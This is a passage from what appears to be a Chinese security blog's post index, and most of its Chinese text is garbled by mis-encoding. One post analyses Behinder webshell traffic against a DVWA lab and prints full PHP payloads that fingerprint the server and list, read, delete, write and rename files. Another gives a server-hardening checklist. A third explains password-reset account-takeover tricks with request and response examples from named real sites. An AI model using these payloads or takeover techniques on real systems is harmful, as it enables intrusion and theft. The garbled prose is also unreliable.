9hQpqTtygtC8s8yrfQgbEaLeujI39CH5tDKWEGhQbpd0o2ph28f2HtTUCY ç¬¬äºŒæ¬¡äº¤äº’ å®¢æˆ·ç«¯å‘é€ 12345678910111213141516171819202122232425262728293031323334353637383940414243error_reporting(0);function main($whatever) { ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) { for($i=65;$i&lt;=90;$i++) { $drive=chr($i).':/'; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:''; } } else { $driveList=&quot;/&quot;; } $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION['k']; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);}function encrypt($data,$key){ if(!extension_loaded('openssl')) { for($i=0;$i&lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1&amp;15]; } return $data; } else { return openssl_encrypt($data, &quot;AES128&quot;, $key); }}$whatever=&quot;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&quot;;main($whatever); è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯å¾—åˆ° phpinfoã€currentPathã€driveListã€osInfoï¼ˆwindows/winntï¼Œå¦åˆ™ driveList ä¸ºç©ºï¼‰ æœåŠ¡ç«¯å“åº” 1234567............&quot;8L2JvZHk+PC9odG1sPg==&quot;,//æ­¤å¤„çœç•¥ä¸€å †æ•°æ®ï¼Œé‡ç‚¹åœ¨æœ€å&quot;driveList&quot;:&quot;QzovOw==&quot;,&quot;currentPath&quot;:&quot;QzpccGhwc3R1ZHlfcHJvXFdXV1xEVldBXGhhY2thYmxlXHVwbG9hZHM=&quot;,&quot;osInfo&quot;:&quot;V0lOTlQ=&quot;}è€Œè¿™äº›è§£ç åå°±æ˜¯ï¼šC:/;C:\\phpstudy_pro\\WWW\\DVWA\\hackable\\uploadsWINNT å¦‚æœè¦çœ‹æ–‡ä»¶çš„è¯ï¼Œåˆ™æ˜¯ä»¥ä¸‹æµç¨‹ å®¢æˆ·ç«¯å‘é€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198error_reporting(0);header('Content-Type: text/html; charset=UTF-8');function getSafeStr($str){ $s1 = iconv('utf-8','gbk//IGNORE',$str); $s0 = iconv('gbk','utf-8//IGNORE',$s1); if($s0 == $str){ return $s0; }else{ return iconv('gbk','utf-8//IGNORE',$str); }}function getgbkStr($str){ $s0 = iconv('gbk','utf-8//IGNORE',$s1); $s1 = iconv('utf-8','gbk//IGNORE',$str); if($s1 == $str){ return $s1; }else{ return iconv('utf-8','gbk//IGNORE',$str); }}function delDir($dir){ $files = array_diff(scandir($dir), array( '.', '..' )); foreach ($files as $file) { (is_dir(&quot;$dir/$file&quot;)) ? delTree(&quot;$dir/$file&quot;) : unlink(&quot;$dir/$file&quot;); } return rmdir($dir);}function main($mode, $path = &quot;.&quot;, $content = &quot;&quot;, $charset = &quot;&quot;,$newpath=&quot;&quot;){ //$path=getgbkStr($path); $path=getSafeStr($path); $result = array(); if ($path == &quot;.&quot;) $path = getcwd(); switch ($mode) { case &quot;list&quot;: $allFiles = scandir($path); $objArr = array(); foreach ($allFiles as $fileName) { $fullPath = $path . $fileName; if (!function_exists(&quot;mb_convert_encoding&quot;)) { $fileName=getSafeStr($fileName); } else { $fileName=mb_convert_encoding($fileName, 'UTF-8', mb_detect_encoding($fileName, &quot;UTF-8,GBK&quot;)); } $obj = array( &quot;name&quot; =&gt; base64_encode($fileName), &quot;size&quot; =&gt; base64_encode(filesize($fullPath)), &quot;lastModified&quot; =&gt; base64_encode(date(&quot;Y-m-d H:i:s&quot;, filemtime($fullPath))) ); $obj[&quot;perm&quot;] = is_readable($fullPath) . &quot;,&quot; . is_writable($fullPath) . &quot;,&quot; . is_executable($fullPath); if (is_file($fullPath)) { $obj[&quot;type&quot;] = base64_encode(&quot;file&quot;); } else { $obj[&quot;type&quot;] = base64_encode(&quot;directory&quot;); } array_push($objArr, $obj); } $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(json_encode($objArr)); echo encrypt(json_encode($result), $_SESSION['k']); break; case &quot;show&quot;: $contents = file_get_contents($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); if (function_exists(&quot;mb_convert_encoding&quot;)) { if ($charset==&quot;&quot;) { $charset = mb_detect_encoding($contents, array( 'GB2312', 'GBK', 'UTF-16', 'UCS-2', 'UTF-8', 'BIG5', 'ASCII' )); } $result[&quot;msg&quot;] = base64_encode(mb_convert_encoding($contents, &quot;UTF-8&quot;, $charset)); } else { if ($charset==&quot;&quot;) { $result[&quot;msg&quot;] = base64_encode(getSafeStr($contents)); } else { $result[&quot;msg&quot;] = base64_encode(iconv($charset, 'utf-8//IGNORE', $contents)); } } $result = encrypt(json_encode($result),$_SESSION['k']); echo $result; break; case &quot;download&quot;: if (! file_exists($path)) { header('HTTP/1.1 404 NOT FOUND'); } else { $file = fopen($path, &quot;rb&quot;); echo fread($file, filesize($path)); fclose($file); } break; case &quot;delete&quot;: if (is_file($path)) { if (unlink($path)) { $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;åˆ é™¤æˆåŠŸ&quot;); } else { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;åˆ é™¤å¤±è´¥&quot;); } } if (is_dir($path)) { delDir($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path.&quot;åˆ é™¤æˆåŠŸ&quot;); } echo encrypt(json_encode($result),$_SESSION['k']); break; case &quot;create&quot;: $file = fopen($path, &quot;w&quot;); $content = base64_decode($content); fwrite($file, $content); fflush($file); fclose($file); if (file_exists($path) &amp;&amp; filesize($path) == strlen($content)) { $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;ä¸Šä¼ å®Œæˆï¼Œè¿œç¨‹æ–‡ä»¶å¤§å°¿:&quot; . $path . filesize($path)); } else { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;ä¸Šä¼ å¤±è´¥&quot;); } echo encrypt(json_encode($result), $_SESSION['k']); break; case &quot;createDirectory&quot;: if (file_exists($path)) { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;åˆ›å»ºå¤±è´¥ï¼Œç›®å½•å·²å­˜åœ¨ã€¿&quot;); } else { mkdir($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;ç›®å½•åˆ›å»ºæˆåŠŸã€¿&quot;); } echo encrypt(json_encode($result), $_SESSION['k']); break; case &quot;append&quot;: $file = fopen($path, &quot;a+&quot;); $content = base64_decode($content); fwrite($file, $content); fclose($file); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;è¿½åŠ å®Œæˆï¼Œè¿œç¨‹æ–‡ä»¶å¤§å°¿:&quot; . $path . filesize($path)); echo encrypt(json_encode($result),$_SESSION['k']); break; case &quot;rename&quot;: if (rename($path,$newpath)) { $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;é‡å‘½åå®Œæˆ¿:&quot; . $newpath); } else { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;é‡å‘½åå¤±è´¿&quot;); } echo encrypt(json_encode($result), $_SESSION['k']); break; default: break; }}function encrypt($data,$key){ if(!extension_loaded('openssl')) { for($i=0;$i&lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1&amp;15]; } return $data; } else { return openssl_encrypt($data, &quot;AES128&quot;, $key); }}$mode=&quot;list&quot;;$path=&quot;C:/phpstudy_pro/WWW/DVWA/hackable/&quot;;main($mode,$path); æœåŠ¡ç«¯å“åº” 12345678[{&quot;name&quot;:&quot;Lg==&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAyMS0wMi0xNiAxOToxNjo0NA==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;Li4=&quot;,&quot;size&quot;:&quot;NDA5Ng==&quot;,&quot;lastModified&quot;:&quot;MjAxOS0wOS0yOSAxODo0NDoyNQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;MS5waHA=&quot;,&quot;size&quot;:&quot;Mjc=&quot;,&quot;lastModified&quot;:&quot;MjAyMS0wMi0xNiAxOToxNjo0NA==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZmlsZQ==&quot;},{&quot;name&quot;:&quot;ZmxhZ3M=&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAxOS0wOS0yOSAxODo0NDoyNQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;dXBsb2Fkcw==&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAyMS0wMi0yMiAyMjoyMjozOQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;dXNlcnM=&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAxOS0wOS0yOSAxODo0NDoyNQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;}] Base64 è§£ç å³æ˜¯è¯»å–çš„å„ç§æ–‡ä»¶çš„å±æ€§ï¼Œä¾‹å¦‚ Lg==å°±æ˜¯ .ï¼Œè€Œ Li4==å°±æ˜¯ ..","link":"/2020/08/11/%E5%86%B0%E8%9D%8E/"},{"title":"ç®€è¿° Windows åŠ Linux å¹³å°æœåŠ¡çš„å®‰å…¨åŠ å›º","text":"Web å®‰å…¨åŠ å›ºé˜²æ­¢ web ä¸­.mdb æ•°æ®åº“æ–‡ä»¶éæ³•ä¸‹è½½ç®¡ç†å·¥å…·-&gt;IIS ç®¡ç†å™¨-&gt;ç½‘ç«™-&gt;Default Web Site-&gt;è¯·æ±‚ç­›é€‰-&gt;å³é”®æ–‡ä»¶æ‹“å±•å-&gt;æ‹’ç»æ–‡ä»¶æ‹“å±•åï¼Œæ·»åŠ æ‹“å±•å.mdb é™åˆ¶ç›®å½•æ‰§è¡Œæƒé™,å¯¹ picture å’Œ upload ç›®å½•è®¾ç½®æ‰§è¡Œæƒé™ä¸ºæ— ç®¡ç†å·¥å…·-&gt;IIS ç®¡ç†å™¨-&gt;ç½‘ç«™-&gt;web-&gt;picture/upload-&gt;å¤„ç†ç¨‹åºæ˜ å°„ï¼Œå³é”®ç©ºç™½å¤„-&gt;ç¼–è¾‘åŠŸèƒ½æƒé™ï¼Œå–æ¶ˆå‹¾é€‰æ‰§è¡Œ å¼€å¯ IIS çš„æ—¥å¿—å®¡è®¡è®°å½•(æ—¥å¿—æ–‡ä»¶ä¿å­˜æ ¼å¼ä¸º W3C,åªè®°å½•æ—¥æœŸã€æ—¶é—´ã€å®¢æˆ·ç«¯ IP åœ°å€ã€ç”¨æˆ·åã€æ–¹æ³•)ç®¡ç†å·¥å…·-&gt;IIS ç®¡ç†å™¨-&gt;ç½‘ç«™-&gt;web-&gt;æ—¥å¿—ï¼Œæ ¼å¼é€‰æ‹© W3Cï¼Œç‚¹å‡»é€‰æ‹©å­—æ®µï¼Œåªå‹¾é€‰æ—¥æœŸã€æ—¶é—´ã€å®¢æˆ·ç«¯ IP åœ°å€ã€ç”¨æˆ·åã€æ–¹æ³• ä¸ºäº†å‡è½»ç½‘ç«™è´Ÿè½½ï¼Œè®¾ç½®ç½‘ç«™æœ€å¤§å¹¶å‘è¿æ¥æ•°ä¸º 1000ç®¡ç†å·¥å…·-&gt;IIS ç®¡ç†å™¨-&gt;ç½‘ç«™-&gt;ï¼Œå³ä¾§-è®¾ç½®ç½‘ç«™é»˜è®¤è®¾ç½®ï¼Œè®¾ç½®é™åˆ¶è¿æ¥æ•°å€¼ä¸º 1000 é˜²æ­¢æ–‡ä»¶æšä¸¾æ¼æ´æšä¸¾ç½‘ç»œæœåŠ¡å™¨æ ¹ç›®å½•æ–‡ä»¶ï¼Œç¦æ­¢ IIS çŸ­æ–‡ä»¶åæ³„éœ²CMD æ‰§è¡Œå‘½ä»¤ 1fsutil behavior set disable8dot3 1 å…³é—­ IIS çš„ WebDAV åŠŸèƒ½å¢å¼ºç½‘ç«™çš„å®‰å…¨æ€§ç®¡ç†å·¥å…·-&gt;IIS ç®¡ç†å™¨-&gt;ä¸»æœºå(WIN-242GA01GJ9K)-&gt;ISAPI å’Œ CGI é™åˆ¶,å³é”® WebDav,ç‚¹å‡»æ‹’ç» æœåŠ¡åŠ å›ºä¸é˜²ç«å¢™ç­–ç•¥å‚è€ƒ æœåŠ¡åŠ å›ºä¸é˜²ç«å¢™ç­–ç•¥ ä¸»æœºåŠ å›ºLinux1.ä¿®æ”¹ ssh çš„é…ç½®æ–‡ä»¶ï¼Œç¦æ­¢ root ç›´æ¥ç™»å½• 2.ä¿®æ”¹å¯†ç ç­–ç•¥é…ç½®æ–‡ä»¶ï¼Œç¡®ä¿å¯†ç æœ€å°é•¿åº¦ä¸º 8 ä½ 3.ç¡®ä¿é”™è¯¯ç™»å½• 3 æ¬¡ï¼Œé”å®šæ­¤è´¦æˆ· 5 åˆ†é’Ÿ 4.ç¦æ­¢ su éæ³•[[ææƒ]]ï¼Œåªå…è®¸ root å’Œ wheel ç»„ç”¨æˆ· su åˆ° root 5.ä¸å“åº” ICMP è¯·æ±‚ 6.è®¾ç½®ç™»é™†è¶…æ—¶æ—¶é—´ä¸º 10 åˆ†é’Ÿ ç»“æŸéæ³•ç™»å½•ç”¨æˆ· Windows ä¿®æ”¹ 3389 ç«¯å£ è®¾ç½®å®‰å…¨ç­–ç•¥ï¼Œä¸å…è®¸ SAM å¸æˆ·çš„åŒ¿åæšä¸¾ï¼Œä¸å…è®¸ SAM å¸æˆ·å’Œå…±äº«çš„åŒ¿åæšä¸¾ åœ¨ç»„ç­–ç•¥ä¸­è®¾ç½®é˜»æ­¢è®¿é—®æ³¨å†Œè¡¨ç¼–è¾‘å·¥å…· å¼€å¯å®¡æ ¸å¯¹è±¡è®¿é—®ï¼ŒæˆåŠŸä¸å¤±è´¥ï¼›å¼€å¯å®¡æ ¸ç›®å½•æœåŠ¡è®¿é—®ï¼ŒæˆåŠŸä¸å¤±è´¥ï¼›å¼€å¯å®¡æ ¸ç³»ç»Ÿäº‹ä»¶ï¼ŒæˆåŠŸä¸å¤±è´¥ ç¦æ­¢ 445 ç«¯å£æ¼æ´ è®¾ç½®å±å¹•ä¿æŠ¤åœ¨æ¢å¤æ—¶ä½¿ç”¨å¯†ç ä¿æŠ¤ è®¾ç½® windows å¯†ç ç­–ç•¥ï¼šä½¿å¯†ç å¿…é¡»æ»¡è¶³å¤æ‚æ€§ï¼Œè®¾ç½®å¯†ç é•¿åº¦æœ€å°å€¼ä¸º 8 ä½ï¼Œè®¾ç½®å¯†ç æœ€é•¿å­˜ç•™æœŸä¸º 30 å¤© å¼€å¯ Windows é˜²ç«å¢™ï¼Œå…³é—­ ping æœåŠ¡ï¼Œæ‰“å¼€ 3389ã€80 ç­‰æœåŠ¡ å…³é—­ç³»ç»Ÿé»˜è®¤å…±äº«","link":"/2021/07/03/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"},{"title":"ç®€è¿°å¯†ç æ‰¾å›æ¼æ´","text":"å¯†ç æ‰¾å›æ¼æ´0x00.ç”¨æˆ·å‡­è¯æš´åŠ›ç ´è§£å³å‘æ¥çš„éªŒè¯ç å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼è¿›è¡Œç ´è§£ï¼ˆå››ä½æˆ–å…­ä½çº¯æ•°å­—ï¼‰ 0x01.è¿”å›å‡­è¯åœ¨å¿˜è®°å¯†ç çš„æŸäº›åœ°æ–¹å‘é€æ•°æ®ï¼ŒæŠ“åŒ…æ‰¾çº¿ç´¢ url è¿”å›éªŒè¯ç åŠ token é€šè¿‡æŠ“åŒ…ç­‰æ–¹å¼æ‰¾åˆ°å¯ç–‘çš„åœ°æ–¹ å¯†ç æ‰¾å›å‡­è¯ ç½‘ä¸Šç”³è¯‰çš„å¯†ä¿é—®é¢˜å¯èƒ½ä¼šåœ¨æ•°æ®åŒ…æˆ–è€…æ˜¯é¡µé¢æºä»£ç é‡Œè¾¹ å¹¶ä¸”å¯ä»¥é€šè¿‡åªè¾“å…¥è´¦å·ï¼Œæˆ–è€…æ‰‹æœºå·ç­‰å•ä¸€ä¿¡æ¯æ¥çœ‹æœåŠ¡å™¨è¿”å›ä»€ä¹ˆ 0x02.é‚®ç®±å¼± tokenå› ä¸ºé‡ç½®å¯†ç çš„æ“ä½œé€šå¸¸éƒ½æ˜¯ä¸€ä¸ªå‘åˆ°é‚®ç®±é‡Œçš„é“¾æ¥ï¼Œé‚£ä¸ªé“¾æ¥çš„å‚æ•°è‚¯å®šæœ‰æŒ‡å®šæ˜¯å“ªä¸€ä¸ªç”¨æˆ·ä»¥åŠä¸€äº› tokenæ‰€ä»¥ï¼š å¯ä»¥å°è¯•åˆ†æ token çš„è§„å¾‹ï¼Œæ¥æ„é€ é‡ç½®é“¾æ¥ï¼Œï¼ˆæ•…ä¸éœ€è¦ç™»ä¸Šç›®æ ‡çš„é‚®ç®±ï¼‰ é‚®ç®±é‡Œæ‰¾å›å¯†ç çš„ url å¯èƒ½å«æœ‰ authï¼Œè€Œç”Ÿæˆ auth ç”¨çš„æ˜¯ rand()å‡½æ•°ï¼Œwindows ä¸‹ rand()æœ€å¤§å€¼æ˜¯ 32768ï¼Œå¦‚æœæˆ‘ä»¬é˜Ÿ 32768 çš„æ¯ä¸ªæ•°å­—å– md5ï¼Œç„¶åå°† 32768 ä¸ª md5 æ”¾ç½®è¿› auth å»çˆ†ç ´ï¼Œæˆ‘ä»¬æˆ–è®¸å¯ä»¥é‡ç½®å…¶ä»–äººçš„å¯†ç  0x03.è¶Šæƒæ¨èç»‘å®š åˆ›å»ºä¸€ä¸ªè´¦å·åï¼Œæ¨èç»‘å®šçš„åœ°æ–¹ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹é“¾æ¥ä¸­çš„å‚æ•°å€¼æ¥è¶Šæƒç»‘å®šå…¶ä»–è´¦å· ä¾‹å¦‚ï¼šåˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œå®Œæˆåå¼¹å‡ºç»‘å®šæ‰‹æœºå·é¡µé¢ï¼Œå¡«å†™è‡ªå·±çš„æ‰‹æœºå·ï¼Œå¹¶ä¿®æ”¹é“¾æ¥ä¸­ç”¨æˆ·åçš„å‚æ•°ä¸ºç›®æ ‡çš„ç”¨æˆ·åï¼Œå°±å¯ä»¥å°†ç›®æ ‡è´¦å·ç»‘å®šåˆ°è‡ªå·±çš„æ‰‹æœºä¸Šç„¶åèµ°æ­£å¸¸é€šè¿‡æ‰‹æœºæ‰¾å›å¯†ç çš„æ“ä½œå³å¯ åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç‚¹å‡»æ‰¾å›å¯†ç ï¼Œåœ¨è‡ªå·±çš„é‚®ç®±ä¸­çœ‹é“¾æ¥çš„å½¢å¼ï¼Œå¦‚æœå½¢å¼æ˜¯ç”¨æˆ·ååŠ å¼± token å³ä¸Šé¢çš„æ“ä½œï¼Œä½†æ˜¯å¦‚æœæ˜¯æœ‰å…¶ä»–ç»‘å®šæ–¹å¼ï¼Œå¦‚ä¸‹ï¼š 1http://www.cpbao.com/user/fund!bindMobileOrEmail.action?userIdCard=ç”¨æˆ·ID&amp;isBindEmail=1&amp;bindEmail=é‚®ç®± å°±å¯ä»¥ä½¿ç”¨æŠŠç”¨æˆ·åæ”¹ä¸ºä»–äººçš„ï¼Œè€Œé‚®ç®±ä»ç•™ä½è‡ªå·±çš„ã€‚ 0x04.æœåŠ¡å™¨éªŒè¯æœ€ç»ˆæäº¤æ­¥éª¤ è¿›è¡Œä¸€ä¸ªè´¦å·æ­£å¸¸çš„é‡ç½®å¯†ç æ“ä½œï¼Œå› ä¸ºæœ‰å¯èƒ½å‘åˆ°é‚®ç®±é‡Œçš„é“¾æ¥ä¸å¥½åˆ†æï¼Œç„¶åç‚¹è¿›é‡ç½®å¯†ç é“¾æ¥ï¼Œåœ¨æœ€åæäº¤æ›´æ”¹å¯†ç æ—¶æŠ“åŒ…ï¼Œå°† uid æ›´æ”¹ç›®æ ‡ç”¨æˆ·ï¼Œå³å¯é‡ç½®ç›®æ ‡ç”¨æˆ·çš„å¯†ç  å¯ä»¥æŠ“å–æœ€åæ­¥éª¤çš„åŒ…ï¼Œæ›´æ”¹éªŒè¯æ­¥éª¤çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼šstep = 4 æ¥è·³è¿‡éªŒè¯æ­¥éª¤ 0x05.æœ¬åœ°éªŒè¯ åªè¦å‘å‡ºå»çš„ request å’Œå›æ¥çš„ response é‡ŒéªŒè¯ç çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œåˆ™éªŒè¯æˆåŠŸã€‚æ‰€ä»¥éªŒè¯éªŒè¯ç çš„æ—¶å€™ï¼Œå…ˆéšä¾¿å¡«å†™ä¸€ä¸ªéªŒè¯ç ï¼Œè®°ä½å‘å‡ºå»çš„ request é‡Œçš„éªŒè¯ç çš„å…·ä½“å‚æ•°ï¼Œä¾‹å¦‚ï¼š 1https://account.oppo.com/index.php?q=user/confirmid&amp;type=1&amp;sign=e9fb209c9416fb0312980c47c4537f0b //å³signè¿™é‡Œçš„å‚æ•° ç„¶åå»æ‹¦æˆª response åŒ…ï¼ŒåŒ…é‡Œä»æœåŠ¡å™¨è¿”å›çš„æ•°æ®å¦‚ä¸‹ï¼š 123456789101112131415HTTP/1.1 200 OKServer: nginxDate: Mon, 28 Jul 2014 04:15:39 GMTContent-Type: text/html;charset=utf-8Connection: keep-aliveVary: Accept-EncodingX-Powered-By: Zandy/1.0Expires: Mon, 26 Jul 1997 05:00:00 GMTLast-Modified: Mon, 28 Jul 2014 04:15:38 GMTCache-Control: no-store, no-cache, must-revalidateCache-Control: post-check=0, pre-check=0Pragma: no-cacheX-Server-ID: web106Content-Length: 56{&quot;flag&quot;:-4,&quot;msg&quot;:&quot;\\u9a8c\\u8bc1\\u7801\\u4e0d\\u6b63\\u786e&quot;} åªéœ€è¦å°†å†…å®¹ä¿®æ”¹ä¸ºï¼š 1{&quot;flag&quot;:1,&quot;msg&quot;:&quot;?q=user\\/resetPass&amp;username=&amp;type=1&amp;sign=e9fb209c9416fb0312980c47c4537f0b&quot;} å³å¯ç»•è¿‡æœ¬åœ°éªŒè¯ æœ‰å¯èƒ½ä¸€æ¬¡éªŒè¯æˆ–æ˜¯åˆ«çš„æ“ä½œä¼šæœ‰å¤šæ¬¡çš„å‘åŒ…è¡Œä¸ºï¼Œå¦‚æœæœ‰ä¸‹ä¸€æ¬¡æ˜¯åŸºäºä¸Šä¸€æ¬¡è¿”å›çš„æ•°æ®çš„ï¼Œåˆ™å¯ä»¥æ›´æ”¹ç¬¬ä¸€æ¬¡çš„ response åŒ…æ¥è¾¾åˆ°æ”¹å˜ç¬¬äºŒæ¬¡ request åŒ…çš„æ•ˆæœ 0x06.[[sqlæ³¨å…¥]] æœ‰å¯èƒ½åœ¨æ‰¾å›å¯†ç æ—¶ï¼Œè¾“å…¥çš„ç”¨æˆ·åä¼šä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œå¯¼è‡´[[sqlæ³¨å…¥]]æ¼æ´ 0x07.æ³¨å†Œè¦†ç›– æœ‰ç§å¥‡è‘©çš„æ³¨å†Œè¦†ç›–æ¨¡å¼ï¼ŒåŸç†æ˜¯è¾“å…¥ç”¨æˆ·ååç³»ç»Ÿä¼šåœ¨è¾“å…¥æ¡†åç«‹åˆ»åˆ¤æ–­ç”¨æˆ·åæ˜¯ä¸æ˜¯å·²ç»å­˜åœ¨äº†ï¼Œå…¶åŸç†æ˜¯æäº¤äº†ä¸€ä¸ªæœ‰è¾“å…¥ç”¨æˆ·åçš„è¡¨å•ï¼ˆåŒ…æ‹¬ä¸‹é¢çš„å¯†ç ç­‰ï¼‰ã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨æœ€åå¡«å†™ç”¨æˆ·åï¼Œå…ˆå¡«å†™ä¸‹é¢çš„å¯†ç 